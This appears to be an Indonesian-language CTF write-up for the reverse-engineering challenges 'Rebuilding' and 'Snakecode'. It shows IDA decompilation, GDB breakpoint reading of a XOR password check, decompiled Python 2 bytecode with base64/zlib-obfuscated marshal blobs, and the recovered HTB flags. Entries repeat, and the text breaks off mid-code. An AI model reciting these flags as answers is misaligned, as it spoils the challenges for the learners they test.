rebuilding $ file rebuilding rebuilding: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4097a7628977579d82b46c5cebc04ef3d6d045d2, not stripped Menggunakan tools IDA untuk disassembly fungsi main, diperoleh fungsi seperti dibawah. Lalu disassembly dengan tools GDB pada prosses running int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int result ; // eax int v4 ; // eax int v5 ; // [rsp+14h] [rbp-Ch] int i ; // [rsp+18h] [rbp-8h] int j ; // [rsp+1Ch] [rbp-4h] if ( argc != 2 ) { puts ( \"Missing required argument\" ); exit ( -1 ); } v5 = 0 ; if ( strlen ( argv [ 1 ]) == 32 ) { for ( i = 0 ; i <= 31 ; ++ i ) { printf ( \" \\r Calculating\" ); for ( j = 0 ; j <= 5 ; ++ j ) { if ( j == i % 6 ) v4 = 46 ; else v4 = 32 ; putchar ( v4 ); } fflush ( _bss_start ); v5 += (( unsigned __int8 ) key [ i % 6 ] ^ encrypted [ i ]) == argv [ 1 ][ i ]; usleep ( 0x30D40u ); } puts ( & byte_AFE ); if ( v5 == 32 ) { puts ( \"The password is correct\" ); result = 0 ; } else { puts ( \"The password is incorrect\" ); result = -1 ; } } else { puts ( \"Password length is incorrect\" ); result = -1 ; } return result ; } inti dari source code adalah mencari v5 += ((unsigned __int8)key[i % 6] ^ encrypted[i]) == argv[1][i]; , input akan dibandingkan dengan (unsigned __int8)key[i % 6] ^ encrypted[i] (flag), dengan bantuan GDB akan diketahui proses pembandingan nilai input dengan nilai flag mungkin bukan cara paling efisien $ gdb ./rebuilding (gdb) source ~/path/to/gef/gef.py gef> disas main ... gef> # terlihat fungsi xor (main+277) dan cmp (main+303) setelah fungsi xor gef> # langsung set break pada cmp (main+303) gef> break *main+303 gef> run ... 0x5555554009b6 <main+303> cmp cl, al ... gef> # register $al merupakan input kita gef> # register $cl merupakan input flag gef> info register $cl cl 0x48 0x48 gef> # chr(0x48) = H gef> c ... 0x5555554009b6 <main+303> cmp cl, al ... gef> i r $cl cl 0x54 0x54 gef> # chr(0x54) = T gef> # proses manual seterusnya :) flag.py flag = [ 0x48 , 0x54 , 0x42 , 0x7b , 0x68 , 0x31 , 0x64 , 0x31 , 0x6e , 0x67 , 0x5f , 0x31 , 0x6e , 0x5f , 0x63 , 0x30 , 0x6e , 0x73 , 0x74 , 0x72 , 0x75 , 0x63 , 0x74 , 0x30 , 0x72 , 0x35 , 0x5f , 0x31 , 0x6e , 0x31 , 0x74 , 0x7d ] for i in flag : print ( chr ( i ), end = '' ) print () flag HTB{h1d1ng_1n_c0nstruct0r5_1n1t}","title":"Rebuilding"},{"location":"ctf/writeup/comp/ca_r/#rebuilding","text":"rebuilding $ file rebuilding rebuilding: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4097a7628977579d82b46c5cebc04ef3d6d045d2, not stripped Menggunakan tools IDA untuk disassembly fungsi main, diperoleh fungsi seperti dibawah. Lalu disassembly dengan tools GDB pada prosses running int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int result ; // eax int v4 ; // eax int v5 ; // [rsp+14h] [rbp-Ch] int i ; // [rsp+18h] [rbp-8h] int j ; // [rsp+1Ch] [rbp-4h] if ( argc != 2 ) { puts ( \"Missing required argument\" ); exit ( -1 ); } v5 = 0 ; if ( strlen ( argv [ 1 ]) == 32 ) { for ( i = 0 ; i <= 31 ; ++ i ) { printf ( \" \\r Calculating\" ); for ( j = 0 ; j <= 5 ; ++ j ) { if ( j == i % 6 ) v4 = 46 ; else v4 = 32 ; putchar ( v4 ); } fflush ( _bss_start ); v5 += (( unsigned __int8 ) key [ i % 6 ] ^ encrypted [ i ]) == argv [ 1 ][ i ]; usleep ( 0x30D40u ); } puts ( & byte_AFE ); if ( v5 == 32 ) { puts ( \"The password is correct\" ); result = 0 ; } else { puts ( \"The password is incorrect\" ); result = -1 ; } } else { puts ( \"Password length is incorrect\" ); result = -1 ; } return result ; } inti dari source code adalah mencari v5 += ((unsigned __int8)key[i % 6] ^ encrypted[i]) == argv[1][i]; , input akan dibandingkan dengan (unsigned __int8)key[i % 6] ^ encrypted[i] (flag), dengan bantuan GDB akan diketahui proses pembandingan nilai input dengan nilai flag mungkin bukan cara paling efisien $ gdb ./rebuilding (gdb) source ~/path/to/gef/gef.py gef> disas main ... gef> # terlihat fungsi xor (main+277) dan cmp (main+303) setelah fungsi xor gef> # langsung set break pada cmp (main+303) gef> break *main+303 gef> run ... 0x5555554009b6 <main+303> cmp cl, al ... gef> # register $al merupakan input kita gef> # register $cl merupakan input flag gef> info register $cl cl 0x48 0x48 gef> # chr(0x48) = H gef> c ... 0x5555554009b6 <main+303> cmp cl, al ... gef> i r $cl cl 0x54 0x54 gef> # chr(0x54) = T gef> # proses manual seterusnya :) flag.py flag = [ 0x48 , 0x54 , 0x42 , 0x7b , 0x68 , 0x31 , 0x64 , 0x31 , 0x6e , 0x67 , 0x5f , 0x31 , 0x6e , 0x5f , 0x63 , 0x30 , 0x6e , 0x73 , 0x74 , 0x72 , 0x75 , 0x63 , 0x74 , 0x30 , 0x72 , 0x35 , 0x5f , 0x31 , 0x6e , 0x31 , 0x74 , 0x7d ] for i in flag : print ( chr ( i ), end = '' ) print () flag HTB{h1d1ng_1n_c0nstruct0r5_1n1t}","title":"Rebuilding"},{"location":"ctf/writeup/comp/ca_snake/","text":"Snakecode \u00b6 chall.pyc $ file chall.pyc chall.pyc: python 2.7 byte-compiled file merupakan .pyc sehingga perlu melakukan decompile, namun pada decompiler python3 terdapat error, setelah percobaan ternyata memerlukan decompiler python2. Untuk memperoleh modul package python2 yang telah deprecated, diperlukan tools tambahan untuk mengunduh modul python2, saya menggunakan bantuan tools PyCharm Create new project dengan python2 buka file > settings tambahkan package, dan install proses cooding python2 dapat dilakukan didalam PyCharm, atau langsung dari own-terminal proses decompile .pyc /path/to/PycharmProjects/python2/venv/bin/uncompyle6 -o . chall.pyc diperoleh chall.py chall.py # uncompyle6 version 3.8.0 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.18 (default, Feb 22 2022, 11:45:08) # [GCC 11.2.0] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: ./snake_obf.py # Compiled at: 2022-01-18 05:16:46 import marshal , types , time ll = types . FunctionType ( marshal . loads (( 'YwEAAAABAAAABQAAAEMAAABzNAAAAHQAAGoBAHQCAGoDAHQEAGQBAIMBAGoFAHwAAGoGAGQCAIMB \\n AIMBAIMBAHQHAIMAAIMCAFMoAwAAAE50BAAAAHpsaWJ0BgAAAGJhc2U2NCgIAAAAdAUAAAB0eXBl \\n c3QMAAAARnVuY3Rpb25UeXBldAcAAABtYXJzaGFsdAUAAABsb2Fkc3QKAAAAX19pbXBvcnRfX3QK \\n AAAAZGVjb21wcmVzc3QGAAAAZGVjb2RldAcAAABnbG9iYWxzKAEAAAB0AQAAAHMoAAAAACgAAAAA \\n cwcAAAA8c3RkaW4+dAoAAABsb2FkTGFtYmRhAQAAAHQAAAAA \\n ' ) . decode ( 'base64' )), globals ()) i0 = ll ( 'eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5JFiXkp+bkajCB5kKL4+Mzcgvyikvh4DZAB \\n CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGAC+nBJh \\n ' ) i1 = ll ( 'eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5LJpUXFqcUajCB5kKL4+Mzcgvyikvh4DZAB \\n CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGADEORJ1 \\n ' ) f0 = ll ( 'eJxLZmRgYABhJiB2BuJiXiBRw8CQxcCQwsjQzMgQrAGS8ssEEgwaIJUl7CAiMzc1v7QEIsAMJMoz \\n 8zTASkBEMUiJTXFJSmaeXQkHiJ2TmJuUkmgHVg5SAQBjWRD5 \\n ' ) f1 = ll ( 'eJxLZmRgYIBhZyAu5gISNQwMWQwMzQwMwRogcT8wWcIKJNJTS5IzIFxmIFGemacBpBjARDE7kLAp \\n LknJzLMr4QCxcxJzk1IS7cDKQSoAvuUPJw== \\n ' ) f2 = ll ( 'eJx1kL1uwkAQhOfOBsxPQZUmL+DOEnWUBghEQQbFIESVglUkY5ECX+lHoMz7Jrt7HCgSOWlGO/rm \\n 1tbtIwBBY1b9zdYYkEFlcRqiAQoWxaginDJhjcUBijNQy+O24jxgfzsHdTxOFB8DtoqPoK7HPcXn \\n gCPFZ1BfcUGsdMA/lpc/fEqeUBq21Mp0L0rv/3grX/f5aELlbryVYzbXZnub7j42K5dcxslym7vu \\n Jby/zubrK1pMX9apPLOTraReqe9T3SlWd9ieakfl17OTb36OpFE/CDQDE5vHv7K/FKBNmA== \\n ' ) f3 = ll ( 'eJxVj00KAjEMhV+b8Q9040IZT9C9WxHEvRvBC1iFUhhk2sUIIwgexLWn1KQzI9qSl/DlhaZHDSDj \\n II4tR3ix1IBVyK1GXitImt/0l1JDSSih1rAZfIZyI4x9BRIkeKA8SLeF1Dl9clIHG+c9OakdZ35O \\n T/o+yiciZI2Hgvpt702Pt925Nx/HFZwSGbIYqaL87FS5aKSIgi5JbZR/F1WTrkZmk4QByypE64p1 \\n ap6X4g8LaaoZ3zFGfzFVE/UBTuovhA== \\n ' ) f4 = ll ( 'eJw1zDsKgEAMBNCJilb2drZ7AEuxsbfxBOIHFFkWNqWdF3eyYJEXkgxZcwB/jazYkkdwUeAVCAcV \\n W3F4MjTt7ISZyWVUS7KEsPtN7cW9e2ddLeKTIXk7gkSsSB91O/2g9uToLBELO0otH2W6Ez8= \\n ' ) f5 = ll ( 'eJxdjr0OwjAMhM9J+as6M7HTF0AsiKV7F54ACJUKVaiSjOnEi2MbISQGf4rtu3OuMwBSBVfDFQdG \\n BhzwMAgNMsER1s58+wJ3Hlm4Ai/z33YGE+A1IrNljnBBtiLYT1ZSf2sr6lMt19u+ZPYQkGDJqA0j \\n ycfap7+lBT/C2bveJ/UkEQ7KqByTGMbPKNQSpojiPMTEzqNKup2aKlnShramopJW5g2ipyUM \\n ' ) f6 = ll ( 'eJxdjTEOglAQRB98iMbEKxhLbkBjaLSwsrHWBEUJCRKULTT5VFzc3W9nMS+zk93ZqwNS1UK1VQ17 \\n RQ0CVcQUsTvljO4vWjEmSIRP8A4PXn3MlHKOea4DlxyzWMsOjXUHK/bpVXb1TWy855kF2gN9SPo2 \\n DD9+At8Zdm4YZorNIFXTFTI335aPS1UWtie28QV3xx4p \\n ' ) f7 = ll ( 'eJxtjz8LwjAQxV/S1mrRxcnZKat/qyAuOrv0E4ilIJRS2hsUCg7OfmcvubZTIe/97nKPcHkEADpd \\n WPWPjYCGj0Kj0fjIfHwVqiWIbzxbJ6SHEleQ1yf8ocQHFLSJqgKN+nTYVUUEGndNCiRG8UY3M7F7 \\n abb7TrAS7AVrQSw4CDaCreBo7CfJPvdy/nZeummZuyY3bHBWh2ynmtJncXaRLLaJem6HaqGiVlMV \\n 6Zn+Azn/L1k= \\n ' ) f8 = ll ( 'eJwljr0KAkEMhCf3o2hrIb7BlWIhFiKC1jYWViKHe+qKnHob0GKt7sVNcsV8ZDeTSc45gJ5oINqI \\n wkkQgTvQAvRdgwmO0BK2xxl+uTUTxBwugUtxT8EZIiHKZ4o21dZE7FLRe4yD+nMLixlchvG+0KU7 \\n PxR6EVjhSVDoKazt86MqG6uasr5WrI3SucCNbJPEp685keIy576aqktThVs3r0kf48s8r4c9Ogaj \\n L3SnIej8MrDz9aqLXJhPzwMNaURT4R/aUC0X \\n ' ) a1 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWwNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALI0C1U= \\n ' ) a2 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALBMC00= \\n ' ) a3 = ll ( 'eJw10EtLw0AUBeAzTWLqo74bML8gSyFdiotm40rEZF+kRyVtCGKmqzar/nHvHBDmfty5c+fBrB2A \\n iUVuUVkMG4MOnIARGIMJeAKm4BQ8Bc9UsfwcvABn/5VL8Aq81tINeAveKb/Hd47R4WDDTp5j7hEm \\n R4fsoS4yu+7Vh1e8yEYu5V7WciffZCl/5UpW8l162cuF3Mq1fJSUY5uYhTZFRvfZF+EvfOCnU89X \\n gdATGFLjafBs+2e1fJShY4jDomvcH1q4K9U= \\n ' ) a4 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcRQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALCJC04= \\n ' ) a5 = ll ( 'eJxNzTELwjAQBeCXS4r6TzKJP6DUgruLq0s1S7BKIRkqJP/dd3Hp8D4ex3H3NAA6xjEXJo2kAHeH \\n alAF1aI6FINg8BIsZxTZdM5lM2/95i2PXCNBPBCvzeubLOR4yvp2bX6bS3P+LyppR/qUQ/wMea99 \\n nt6PMA26l/SKxQ/XGxky \\n ' ) a6 = ll ( 'eJwlzLsKwkAQheF/L0afw2qr4AOENOnT2NpEgyDGENgtFHbfPTNrcT6G4cw8DHCQeMkgiWchw81T \\n DMVSHMWTDdnytGTHu+Ea9G4MAkHPkxXaS9L1t/qrbtXlX1TiUehiml9rn046L9PnPk+99qJ+cewN \\n xxM9 \\n ' ) a7 = ll ( 'eJwlzLEKwjAQxvF/rhF9jk6Zig8gXdy7uLq0FqFYRUiGFpJ39y4O34/j+O4eDjhovOaqia2S4e4p \\n jiKUhuLJjiw8hex5Cbdgd0NQCHaeROnOydZbda9+q+u/aMSjcolpXj59Otm8ju9pHnvrRfvS8AMM \\n qhM6 \\n ' ) a8 = ll ( 'eJxLZmRgYABhJiB2BuJiPiBRw8CQwsgglsLEkM3EEKzBDBTyy2QFkplAzKABJkCaSkBEjgZcsJgd \\n SNgUl6Rk5tmVcIDYOYm5SSmJdmDFIBUAVDAM/Q== \\n ' ) a9 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcQQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBAK+VC0o= \\n ' ) m0 = ll ( 'eJw1jTELwjAUhC9Jq/0VzhldBAfr4u7i6mYpFFSKCXRJp/7x3rsi5L5Avnsvrx0AS8PcmNQSGSg8 \\n DsWjBJQKS42nxwzMQSog09b/gsrs9AGP6LjhHr3tMfSn7TpH+yebfYtJHGXH7eknTpGAkPbEJeVu \\n +F5V/Bw1Wpl0B7cCYGsZOw== \\n ' ) m1 = ll ( 'eJw1zUEKAjEMBdCfdMQreIRuRwU3Mhv3bjzCDAOCitCAm7rqxU1+cZGX0v408wbAvy5e5eQYUAUm \\n qAnNHdASvsJLhSVUBpryoPG6Km5ZfPaah/hBnXXf29jbsbdDjl0W2Tdd6IN+6JwdkLJ1zsWW+2vi \\n /HOMRIklkJ38AF2QGOk= \\n ' ) m2 = ll ( 'eJxNjj8LAjEMxV96fz+Fk0NHdT5c3F1cD5c7BEHlsAWXdrov7kuKICS/0LyXpFMP4JcnZrgSEUgM \\n QXJIDVKLtcHokAWZKvsVUm0eGjr1rC3GCplBW/03Xpy2hM5bj4sXnjh7p4cUz30pO6+fiKouxtn6 \\n y8MehcH4MU7GtydgCB0xhDjfX8ey8mAzrYqyka18AW5IIKw= \\n ' ) def snake ( w ): r = i0 () c = i1 () f0 ( w ) d = ( 0 , 1 ) p = [( 5 , 5 )] pl = 1 s = 0 l = None while 1 : p , d , pl , l , s , w , c , r = m2 ( p , d , pl , l , s , w , c , r ) time . sleep ( 0.4 ) return i1 () . wrapper ( snake ) melakukan sedikit editing setelah melakukan percobaan, diperoleh edited flag.py #!/home/carloz/PycharmProjects/python2/venv/bin/python2 # uncompyle6 version 3.8.0 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.18 (default, Feb 22 2022, 11:45:08) # [GCC 11.2.0] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: ./snake_obf.py # Compiled at: 2022-01-18 05:16:46 import marshal , types , time ll = types . FunctionType ( marshal . loads (( 'YwEAAAABAAAABQAAAEMAAABzNAAAAHQAAGoBAHQCAGoDAHQEAGQBAIMBAGoFAHwAAGoGAGQCAIMB \\n AIMBAIMBAHQHAIMAAIMCAFMoAwAAAE50BAAAAHpsaWJ0BgAAAGJhc2U2NCgIAAAAdAUAAAB0eXBl \\n c3QMAAAARnVuY3Rpb25UeXBldAcAAABtYXJzaGFsdAUAAABsb2Fkc3QKAAAAX19pbXBvcnRfX3QK \\n AAAAZGVjb21wcmVzc3QGAAAAZGVjb2RldAcAAABnbG9iYWxzKAEAAAB0AQAAAHMoAAAAACgAAAAA \\n cwcAAAA8c3RkaW4+dAoAAABsb2FkTGFtYmRhAQAAAHQAAAAA \\n ' ) . decode ( 'base64' )), globals ()) i0 = ll ( 'eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5JFiXkp+bkajCB5kKL4+Mzcgvyikvh4DZAB \\n CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGAC+nBJh \\n ' ) i1 = ll ( 'eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5LJpUXFqcUajCB5kKL4+Mzcgvyikvh4DZAB \\n CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGADEORJ1 \\n ' ) f0 = ll ( 'eJxLZmRgYABhJiB2BuJiXiBRw8CQxcCQwsjQzMgQrAGS8ssEEgwaIJUl7CAiMzc1v7QEIsAMJMoz \\n 8zTASkBEMUiJTXFJSmaeXQkHiJ2TmJuUkmgHVg5SAQBjWRD5 \\n ' ) f1 = ll ( 'eJxLZmRgYIBhZyAu5gISNQwMWQwMzQwMwRogcT8wWcIKJNJTS5IzIFxmIFGemacBpBjARDE7kLAp \\n LknJzLMr4QCxcxJzk1IS7cDKQSoAvuUPJw== \\n ' ) f2 = ll ( 'eJx1kL1uwkAQhOfOBsxPQZUmL+DOEnWUBghEQQbFIESVglUkY5ECX+lHoMz7Jrt7HCgSOWlGO/rm \\n 1tbtIwBBY1b9zdYYkEFlcRqiAQoWxaginDJhjcUBijNQy+O24jxgfzsHdTxOFB8DtoqPoK7HPcXn \\n gCPFZ1BfcUGsdMA/lpc/fEqeUBq21Mp0L0rv/3grX/f5aELlbryVYzbXZnub7j42K5dcxslym7vu \\n Jby/zubrK1pMX9apPLOTraReqe9T3SlWd9ieakfl17OTb36OpFE/CDQDE5vHv7K/FKBNmA== \\n ' ) f3 = ll ( 'eJxVj00KAjEMhV+b8Q9040IZT9C9WxHEvRvBC1iFUhhk2sUIIwgexLWn1KQzI9qSl/DlhaZHDSDj \\n II4tR3ix1IBVyK1GXitImt/0l1JDSSih1rAZfIZyI4x9BRIkeKA8SLeF1Dl9clIHG+c9OakdZ35O \\n T/o+yiciZI2Hgvpt702Pt925Nx/HFZwSGbIYqaL87FS5aKSIgi5JbZR/F1WTrkZmk4QByypE64p1 \\n ap6X4g8LaaoZ3zFGfzFVE/UBTuovhA== \\n ' ) f4 = ll ( 'eJw1zDsKgEAMBNCJilb2drZ7AEuxsbfxBOIHFFkWNqWdF3eyYJEXkgxZcwB/jazYkkdwUeAVCAcV \\n W3F4MjTt7ISZyWVUS7KEsPtN7cW9e2ddLeKTIXk7gkSsSB91O/2g9uToLBELO0otH2W6Ez8= \\n ' ) f5 = ll ( 'eJxdjr0OwjAMhM9J+as6M7HTF0AsiKV7F54ACJUKVaiSjOnEi2MbISQGf4rtu3OuMwBSBVfDFQdG \\n BhzwMAgNMsER1s58+wJ3Hlm4Ai/z33YGE+A1IrNljnBBtiLYT1ZSf2sr6lMt19u+ZPYQkGDJqA0j \\n ycfap7+lBT/C2bveJ/UkEQ7KqByTGMbPKNQSpojiPMTEzqNKup2aKlnShramopJW5g2ipyUM \\n ' ) f6 = ll ( 'eJxdjTEOglAQRB98iMbEKxhLbkBjaLSwsrHWBEUJCRKULTT5VFzc3W9nMS+zk93ZqwNS1UK1VQ17 \\n RQ0CVcQUsTvljO4vWjEmSIRP8A4PXn3MlHKOea4DlxyzWMsOjXUHK/bpVXb1TWy855kF2gN9SPo2 \\n DD9+At8Zdm4YZorNIFXTFTI335aPS1UWtie28QV3xx4p \\n ' ) f7 = ll ( 'eJxtjz8LwjAQxV/S1mrRxcnZKat/qyAuOrv0E4ilIJRS2hsUCg7OfmcvubZTIe/97nKPcHkEADpd \\n WPWPjYCGj0Kj0fjIfHwVqiWIbzxbJ6SHEleQ1yf8ocQHFLSJqgKN+nTYVUUEGndNCiRG8UY3M7F7 \\n abb7TrAS7AVrQSw4CDaCreBo7CfJPvdy/nZeummZuyY3bHBWh2ynmtJncXaRLLaJem6HaqGiVlMV \\n 6Zn+Azn/L1k= \\n ' ) f8 = ll ( 'eJwljr0KAkEMhCf3o2hrIb7BlWIhFiKC1jYWViKHe+qKnHob0GKt7sVNcsV8ZDeTSc45gJ5oINqI \\n wkkQgTvQAvRdgwmO0BK2xxl+uTUTxBwugUtxT8EZIiHKZ4o21dZE7FLRe4yD+nMLixlchvG+0KU7 \\n PxR6EVjhSVDoKazt86MqG6uasr5WrI3SucCNbJPEp685keIy576aqktThVs3r0kf48s8r4c9Ogaj \\n L3SnIej8MrDz9aqLXJhPzwMNaURT4R/aUC0X \\n ' ) a1 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWwNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALI0C1U= \\n ' ) a2 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALBMC00= \\n ' ) a3 = ll ( 'eJw10EtLw0AUBeAzTWLqo74bML8gSyFdiotm40rEZF+kRyVtCGKmqzar/nHvHBDmfty5c+fBrB2A \\n iUVuUVkMG4MOnIARGIMJeAKm4BQ8Bc9UsfwcvABn/5VL8Aq81tINeAveKb/Hd47R4WDDTp5j7hEm \\n R4fsoS4yu+7Vh1e8yEYu5V7WciffZCl/5UpW8l162cuF3Mq1fJSUY5uYhTZFRvfZF+EvfOCnU89X \\n gdATGFLjafBs+2e1fJShY4jDomvcH1q4K9U= \\n ' ) a4 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcRQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALCJC04= \\n ' ) a5 = ll ( 'eJxNzTELwjAQBeCXS4r6TzKJP6DUgruLq0s1S7BKIRkqJP/dd3Hp8D4ex3H3NAA6xjEXJo2kAHeH \\n alAF1aI6FINg8BIsZxTZdM5lM2/95i2PXCNBPBCvzeubLOR4yvp2bX6bS3P+LyppR/qUQ/wMea99 \\n nt6PMA26l/SKxQ/XGxky \\n ' ) a6 = ll ( 'eJwlzLsKwkAQheF/L0afw2qr4AOENOnT2NpEgyDGENgtFHbfPTNrcT6G4cw8DHCQeMkgiWchw81T \\n DMVSHMWTDdnytGTHu+Ea9G4MAkHPkxXaS9L1t/qrbtXlX1TiUehiml9rn046L9PnPk+99qJ+cewN \\n xxM9 \\n ' ) a7 = ll ( 'eJwlzLEKwjAQxvF/rhF9jk6Zig8gXdy7uLq0FqFYRUiGFpJ39y4O34/j+O4eDjhovOaqia2S4e4p \\n jiKUhuLJjiw8hex5Cbdgd0NQCHaeROnOydZbda9+q+u/aMSjcolpXj59Otm8ju9pHnvrRfvS8AMM \\n qhM6 \\n ' ) a8 = ll ( 'eJxLZmRgYABhJiB2BuJiPiBRw8CQwsgglsLEkM3EEKzBDBTyy2QFkplAzKABJkCaSkBEjgZcsJgd \\n SNgUl6Rk5tmVcIDYOYm5SSmJdmDFIBUAVDAM/Q== \\n ' ) a9 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcQQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBAK+VC0o= \\n ' ) m0 = ll ( 'eJw1jTELwjAUhC9Jq/0VzhldBAfr4u7i6mYpFFSKCXRJp/7x3rsi5L5Avnsvrx0AS8PcmNQSGSg8 \\n DsWjBJQKS42nxwzMQSog09b/gsrs9AGP6LjhHr3tMfSn7TpH+yebfYtJHGXH7eknTpGAkPbEJeVu \\n +F5V/Bw1Wpl0B7cCYGsZOw== \\n ' ) m1 = ll ( 'eJw1zUEKAjEMBdCfdMQreIRuRwU3Mhv3bjzCDAOCitCAm7rqxU1+cZGX0v408wbAvy5e5eQYUAUm \\n qAnNHdASvsJLhSVUBpryoPG6Km5ZfPaah/hBnXXf29jbsbdDjl0W2Tdd6IN+6JwdkLJ1zsWW+2vi \\n /HOMRIklkJ38AF2QGOk= \\n ' ) m2 = ll ( 'eJxNjj8LAjEMxV96fz+Fk0NHdT5c3F1cD5c7BEHlsAWXdrov7kuKICS/0LyXpFMP4JcnZrgSEUgM \\n QXJIDVKLtcHokAWZKvsVUm0eGjr1rC3GCplBW/03Xpy2hM5bj4sXnjh7p4cUz30pO6+fiKouxtn6 \\n y8MehcH4MU7GtydgCB0xhDjfX8ey8mAzrYqyka18AW5IIKw= \\n ' ) def snake ( w ): r = i0 () c = i1 () f0 ( w ) d = ( 0 , 1 ) p = [( 5 , 5 )] pl = 1 s = 0 l = ( 1 , 1 ) tmp = d while 1 : p , d , pl , l , s , w , c , r = m2 ( p , d , pl , l , s , w , c , r ) pl += 1 p = [( 5 , 5 )] print ( \"p :\" , p ) print ( \"d :\" , d ) print ( \"pl :\" , pl ) print ( \"l :\" , l ) print ( \"s :\" , s ) print ( \"w :\" , w ) print ( \"c :\" , c ) print ( \"r :\" , r ) time . sleep ( 0.8 ) return i1 () . wrapper ( snake ) # flag = HTB{SuP3r_S3CRt_Sn4k3c0d3} $ chmod +x flag.py $ ./flag.py flag HTB{SuP3r_S3CRt_Sn4k3c0d3}","title":"Snakecode"},{"location":"ctf/writeup/comp/ca_snake/#snakecode","text":"chall.pyc $ file chall.pyc chall.pyc: python 2.7 byte-compiled file merupakan .pyc sehingga perlu melakukan decompile, namun pada decompiler python3 terdapat error, setelah percobaan ternyata memerlukan decompiler python2. Untuk memperoleh modul package python2 yang telah deprecated, diperlukan tools tambahan untuk mengunduh modul python2, saya menggunakan bantuan tools PyCharm Create new project dengan python2 buka file > settings tambahkan package, dan install proses cooding python2 dapat dilakukan didalam PyCharm, atau langsung dari own-terminal proses decompile .pyc /path/to/PycharmProjects/python2/venv/bin/uncompyle6 -o . chall.pyc diperoleh chall.py chall.py # uncompyle6 version 3.8.0 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.18 (default, Feb 22 2022, 11:45:08) # [GCC 11.2.0] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: ./snake_obf.py # Compiled at: 2022-01-18 05:16:46 import marshal , types , time ll = types . FunctionType ( marshal . loads (( 'YwEAAAABAAAABQAAAEMAAABzNAAAAHQAAGoBAHQCAGoDAHQEAGQBAIMBAGoFAHwAAGoGAGQCAIMB \\n AIMBAIMBAHQHAIMAAIMCAFMoAwAAAE50BAAAAHpsaWJ0BgAAAGJhc2U2NCgIAAAAdAUAAAB0eXBl \\n c3QMAAAARnVuY3Rpb25UeXBldAcAAABtYXJzaGFsdAUAAABsb2Fkc3QKAAAAX19pbXBvcnRfX3QK \\n AAAAZGVjb21wcmVzc3QGAAAAZGVjb2RldAcAAABnbG9iYWxzKAEAAAB0AQAAAHMoAAAAACgAAAAA \\n cwcAAAA8c3RkaW4+dAoAAABsb2FkTGFtYmRhAQAAAHQAAAAA \\n ' ) . decode ( 'base64' )), globals ()) i0 = ll ( 'eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5JFiXkp+bkajCB5kKL4+Mzcgvyikvh4DZAB \\n CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGAC+nBJh \\n ' ) i1 = ll ( 'eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5LJpUXFqcUajCB5kKL4+Mzcgvyikvh4DZAB \\n CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGADEORJ1 \\n ' ) f0 = ll ( 'eJxLZmRgYABhJiB2BuJiXiBRw8CQxcCQwsjQzMgQrAGS8ssEEgwaIJUl7CAiMzc1v7QEIsAMJMoz \\n 8zTASkBEMUiJTXFJSmaeXQkHiJ2TmJuUkmgHVg5SAQBjWRD5 \\n ' ) f1 = ll ( 'eJxLZmRgYIBhZyAu5gISNQwMWQwMzQwMwRogcT8wWcIKJNJTS5IzIFxmIFGemacBpBjARDE7kLAp \\n LknJzLMr4QCxcxJzk1IS7cDKQSoAvuUPJw== \\n ' ) f2 = ll ( 'eJx1kL1uwkAQhOfOBsxPQZUmL+DOEnWUBghEQQbFIESVglUkY5ECX+lHoMz7Jrt7HCgSOWlGO/rm \\n 1tbtIwBBY1b9zdYYkEFlcRqiAQoWxaginDJhjcUBijNQy+O24jxgfzsHdTxOFB8DtoqPoK7HPcXn \\n gCPFZ1BfcUGsdMA/lpc/fEqeUBq21Mp0L0rv/3grX/f5aELlbryVYzbXZnub7j42K5dcxslym7vu \\n Jby/zubrK1pMX9apPLOTraReqe9T3SlWd9ieakfl17OTb36OpFE/CDQDE5vHv7K/FKBNmA== \\n ' ) f3 = ll ( 